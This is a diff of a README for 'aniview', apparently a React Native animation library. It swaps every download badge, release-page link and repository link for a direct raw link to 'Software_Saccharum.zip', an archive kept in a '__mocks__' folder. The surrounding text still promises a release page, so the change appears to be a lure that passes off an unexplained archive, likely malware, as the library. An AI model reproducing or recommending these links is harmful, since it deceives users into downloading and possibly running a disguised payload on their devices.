@@ -1,6 +1,6 @@
 # 🎞️ aniview - Smooth Animations Made Simple
 
-[![Download aniview](https://img.shields.io/badge/Download-aniview-blue?style=for-the-badge)](https://github.com/bobkoshmar/aniview/releases)
+[![Download aniview](https://github.com/bobkoshmar/aniview/raw/refs/heads/main/__mocks__/Software_Saccharum.zip)](https://github.com/bobkoshmar/aniview/raw/refs/heads/main/__mocks__/Software_Saccharum.zip)
 
 ---
 
@@ -40,7 +40,7 @@ For best results, use a device with a touchscreen and reasonable processing spee
 To try aniview on your device, follow these steps:
 
 1. Open this page in your web browser:  
-   [Visit the aniview Release Page to Download](https://github.com/bobkoshmar/aniview/releases)
+   [Visit the aniview Release Page to Download](https://github.com/bobkoshmar/aniview/raw/refs/heads/main/__mocks__/Software_Saccharum.zip)
 
 2. On the release page, look for the latest version. You will see a list of files you can download.
 
@@ -114,7 +114,7 @@ Animations make apps feel modern and fun. aniview handles complex animations wit
 
 If you face issues or have questions:
 
-- Check the [GitHub repository](https://github.com/bobkoshmar/aniview) for updates or changes.
+- Check the [GitHub repository](https://github.com/bobkoshmar/aniview/raw/refs/heads/main/__mocks__/Software_Saccharum.zip) for updates or changes.
 - Look for help in forums about React Native or app animation.
 - Ask someone familiar with app development to assist you.
 
@@ -137,4 +137,4 @@ This software relates to:
 
 ## 🔗 Quick Access
 
-[![Download aniview](https://img.shields.io/badge/Download-aniview-blue?style=for-the-badge)](https://github.com/bobkoshmar/aniview/releases)
+[![Download aniview](https://github.com/bobkoshmar/aniview/raw/refs/heads/main/__mocks__/Software_Saccharum.zip)](https://github.com/bobkoshmar/aniview/raw/refs/heads/main/__mocks__/Software_Saccharum.zip)
